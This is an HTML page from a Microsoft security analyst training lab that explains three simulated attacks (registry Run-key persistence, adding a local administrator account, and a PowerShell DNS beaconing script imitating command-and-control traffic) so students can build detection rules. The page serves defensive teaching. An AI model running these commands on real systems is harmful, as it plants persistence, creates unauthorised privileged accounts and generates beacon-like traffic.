@@ -1,0 +1,147 @@
+<!DOCTYPE html><html lang="en"><head>
+        <title>
+            SC-200T00A-Microsoft-Security-Operations-Analyst
+        </title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" crossorigin="anonymous">
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" crossorigin="anonymous">
+        <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/vs.min.css">
+        <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+        <script>hljs.initHighlightingOnLoad();</script>
+        <link rel="stylesheet" href="/SC-200T00A-Microsoft-Security-Operations-Analyst/assets/css/style.css?v=20cbc7b52187d61fca294ac2c00146c2c7c6d337">
+    </head>
+    <body data-spy="scroll" data-target="#linksMenu">
+    <nav class="navbar navbar-expand-lg navbar-dark bg-black">
+        <div class="container d-flex justify-content-between">
+            <a class="my-1 title text-azure text-uppercase" href="../../">
+                SC-200T00A-Microsoft-Security-Operations-Analyst
+            </a>
+            <a href="https://github.com/MicrosoftLearning/SC-200T00A-Microsoft-Security-Operations-Analyst" target="_blank" class="btn btn-sm btn-outline-secondary text-light">
+                <i class="fa fa-github" aria-hidden="true"></i>
+                <span class="ml-2">GitHub</span>
+            </a>
+        </div>
+    </nav>
+    <div class="container">
+        <main class="row extra-padding">
+            <aside class="col-sm-2">       
+                <nav id="linksMenu" class="toc sticky-top">
+                    <ul class="nav navbar-nav flex-column">
+                    <li class="nav-item"><a class="nav-link" href="#task-1-understand-the-attacks">Task 1: Understand the Attacks</a></li><li class="nav-item"><a class="nav-link" href="#attack-3---dns--c2">Attack 3 - DNS / C2</a></li><li class="nav-item"><a class="nav-link" href="#task-2-understand-detection-modeling">Task 2: Understand Detection Modeling.</a></li></ul>
+                </nav>         
+            </aside>
+            <hr class>
+            <article class="col-sm-10 mb-5">
+                <h1 id="module-7---lab-1---exercise-4---understand-detection-modeling">Module 7 - Lab 1 - Exercise 4 - Understand Detection Modeling</h1>
+
+<h3 id="task-1-understand-the-attacks">Task 1: Understand the Attacks</h3>
+
+<p><strong>IMPORTANT: You will perform no actions in this exercise.</strong>  These instructions are only an explanation of the attacks you will perform in the next exercise. Please carefully read this page.</p>
+
+<p>The attack patterns are based on an open-source project: https://github.com/redcanaryco/atomic-red-team</p>
+
+<blockquote>
+  <p><strong>Note:</strong> Some settings are triggered in a smaller time-frame just for our lab purpose.</p>
+</blockquote>
+
+<h4 id="attack-1---persistence-with-registry-key-add">Attack 1 - Persistence with Registry Key Add.</h4>
+
+<p>This attack is run from a command prompt:</p>
+
+<div class="code-header mt-3 mb-0 bg-light d-flex justify-content-between border"><span class="mx-2 text-muted text-capitalize font-weight-light">code</span><button class="m-0 btn btn-code btn-sm btn-light codeBtn rounded-0 border-left text-muted font-weight-light" data-clipboard-target="#codeBlock0" type="button"><i class="fa fa-files-o mr-2" aria-hidden="true"></i>Copy</button></div><pre id="codeBlock0" class="mt-0"><code class="language-Command">REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "SOC Test" /t REG_SZ /F /D "C:\temp\startup.bat"
+</code></pre>
+
+<h4 id="attack-2---user-add-and-elevate-privilege">Attack 2 - User Add and Elevate Privilege</h4>
+
+<p>Attackers will add new users and elevate the new user to the Administrators group.  This enables the attacker to logon with a different account that is privileged.</p>
+
+<div class="code-header mt-3 mb-0 bg-light d-flex justify-content-between border"><span class="mx-2 text-muted text-capitalize font-weight-light">code</span><button class="m-0 btn btn-code btn-sm btn-light codeBtn rounded-0 border-left text-muted font-weight-light" data-clipboard-target="#codeBlock1" type="button"><i class="fa fa-files-o mr-2" aria-hidden="true"></i>Copy</button></div><pre id="codeBlock1" class="mt-0"><code class="language-Command">net user theusernametoadd /add
+net user theusernametoadd ThePassword1!
+net localgroup administrators theusernametoadd /add
+</code></pre>
+
+<h3 id="attack-3---dns--c2">Attack 3 - DNS / C2</h3>
+
+<p>This attack will simulate a command and control (C2) communication.</p>
+
+<div class="code-header mt-3 mb-0 bg-light d-flex justify-content-between border"><span class="mx-2 text-muted text-capitalize font-weight-light">code</span><button class="m-0 btn btn-code btn-sm btn-light codeBtn rounded-0 border-left text-muted font-weight-light" data-clipboard-target="#codeBlock2" type="button"><i class="fa fa-files-o mr-2" aria-hidden="true"></i>Copy</button></div><pre id="codeBlock2" class="mt-0"><code class="language-PowerShell">param(
+    [string]$Domain = "microsoft.com",
+    [string]$Subdomain = "subdomain",
+    [string]$Sub2domain = "sub2domain",
+    [string]$Sub3domain = "sub3domain",
+    [string]$QueryType = "TXT",
+        [int]$C2Interval = 8,
+        [int]$C2Jitter = 20,
+        [int]$RunTime = 240
+)
+$RunStart = Get-Date
+$RunEnd = $RunStart.addminutes($RunTime)
+$x2 = 1
+$x3 = 1 
+Do {
+    $TimeNow = Get-Date
+    Resolve-DnsName -type $QueryType $Subdomain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
+    if ($x2 -eq 3 )
+    {
+        Resolve-DnsName -type $QueryType $Sub2domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
+        $x2 = 1
+    }
+    else
+    {
+        $x2 = $x2 + 1
+    }
+    if ($x3 -eq 7 )
+    {
+        Resolve-DnsName -type $QueryType $Sub3domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
+        $x3 = 1
+    }
+    else
+    {
+        $x3 = $x3 + 1
+    }
+    $Jitter = ((Get-Random -Minimum -$C2Jitter -Maximum $C2Jitter) / 100 + 1) +$C2Interval
+    Start-Sleep -Seconds $Jitter
+}
+Until ($TimeNow -ge $RunEnd)
+</code></pre>
+
+<h3 id="task-2-understand-detection-modeling">Task 2: Understand Detection Modeling.</h3>
+
+<p>The attack-detect configuration cycle used in this lab represents all data sources even though you are only focused on two specific data sources.</p>
+
+<p>To build a detection, you first start with building a KQL statement.  Since you will attack a host, you will have representative data to start building the KQL statement.</p>
+
+<p>The following lab runs the same attacks on a Windows host with Defender for Endpoint installed and Windows with Sysmon installed.  As you build the detections, you will see the difference in data normalization for each.</p>
+
+<p>After you have the KQL statement, you create the Analytical Rule.</p>
+
+<p>Once the rule triggers and creates the alerts and incidents, you then investigate to decide if you are providing fields that help Security Operations Analysts in their investigation.</p>
+
+<p>Next, make any other changes to the analytics rule.</p>
+
+<h1 id="proceed-to-exercise-5">Proceed to Exercise 5</h1>
+
+            </article>
+        </main>
+    </div>
+    <footer class="fixed-bottom d-print-none">
+        <nav class="navbar navbar-light bg-light d-flex justify-content-around">
+            <span class="navbar-text">
+                <i class="fa fa-github" aria-hidden="true"></i>
+                <a href="https://github.com/MicrosoftLearning/SC-200T00A-Microsoft-Security-Operations-Analyst" target="_blank" class="ml-2">
+                    MicrosoftLearning/SC-200T00A-Microsoft-Security-Operations-Analyst
+                </a>
+            </span>
+        </nav>
+    </footer>
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" crossorigin="anonymous"></script>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+    <script src="../../assets/js/script_v%3D20cbc7b52187d61fca294ac2c00146c2c7c6d337.js"></script>
+
+
+
+</body></html>
